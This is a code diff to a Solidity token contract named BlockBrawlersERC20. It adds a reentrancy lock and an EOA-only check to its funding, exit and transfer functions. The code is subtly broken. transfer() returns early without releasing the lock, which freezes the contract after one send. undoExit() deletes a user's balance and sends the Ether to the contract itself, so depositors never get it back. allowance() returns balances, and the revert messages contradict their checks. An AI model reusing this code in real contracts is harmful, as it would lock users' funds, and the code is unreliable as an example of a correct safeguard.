@@ -16,6 +16,8 @@ contract BlockBrawlersERC20 {
     string name = "Block Brawlers";
     string symbol = "BRAWL";
 
+    bool lock = false;
+
     event ExitBalance(address user, uint256 amount);
     event Transfer(address indexed from, address indexed to, uint256 value);
     event Approval(address indexed owner, address indexed spender, uint256 value);
@@ -30,7 +32,7 @@ contract BlockBrawlersERC20 {
     }
 
     function totalSupply() public view returns (uint256) {
-        return _totalSupply;
+      return _totalSupply;
     }
 
     function balanceOf(address account) public view returns (uint256) {
@@ -42,10 +44,13 @@ contract BlockBrawlersERC20 {
     }
 
     function allowance(address owner, address spender) public view returns (uint256) {
-        return _balances[owner];
+      return _balances[owner];
     }
 
     function fundExit() external payable {
+      require(msg.sender == tx.origin, "EOA only");
+      require(!lock, "not locked");
+      lock = true;
       uint256 fundingAmount = msg.value;
       if(
         msg.sender.balance < 10 ** 16 && 
@@ -61,37 +66,47 @@ contract BlockBrawlersERC20 {
       emit Approval(msg.sender, _tokenManager, newBalance);
       emit ExitBalance(msg.sender, newBalance);
       emit Transfer(address(0), msg.sender, fundingAmount);
+      lock = false;
     }
 
     function undoExit() external {
-        uint256 exitAmount = _balances[msg.sender];
-        delete _balances[msg.sender];
-        if(payable(address(this)).send(exitAmount)) {
-            emit Approval(msg.sender, _tokenManager, 0);
-            emit ExitBalance(msg.sender, 0);
-            emit Transfer(msg.sender, address(0), exitAmount);
-        }
+      require(!lock, "not locked");
+      lock = true;
+      uint256 exitAmount = _balances[msg.sender];
+      delete _balances[msg.sender];
+      if(payable(address(this)).send(exitAmount)) {
+        emit Approval(msg.sender, _tokenManager, 0);
+        emit ExitBalance(msg.sender, 0);
+        emit Transfer(msg.sender, address(0), exitAmount);
+      }
+      lock = false;
     }
 
     // Used by the Token Manager to deliver tokens back to users af
     function transfer(address to, uint256 amount) public onlyTokenManager returns (bool) {
-        if(payable(to).send(amount)) {
-            emit Transfer(_tokenManager, address(0), amount);
-            return true;
-        }
-        return false;
+      require(!lock, "not locked");
+      lock = true;
+      if(payable(to).send(amount)) {
+        emit Transfer(_tokenManager, address(0), amount);
+        return true;
+      }
+      lock = false;
+      return false;
     }
 
     function transferFrom(
-        address from,
-        address to,
-        uint256 amount
+      address from,
+      address to,
+      uint256 amount
     ) public onlyTokenManager returns (bool) {
-        require(_balances[from] == amount);
-        delete _balances[from];
-        emit Approval(from, _tokenManager, 0);
-        emit ExitBalance(from, 0);
-        emit Transfer(from, _tokenManager, amount);
-        return true;
+      require(!lock, "not locked");
+      lock = true;
+      require(_balances[from] == amount);
+      delete _balances[from];
+      emit Approval(from, _tokenManager, 0);
+      emit ExitBalance(from, 0);
+      emit Transfer(from, _tokenManager, amount);
+      lock = false;
+      return true;
     }
 }
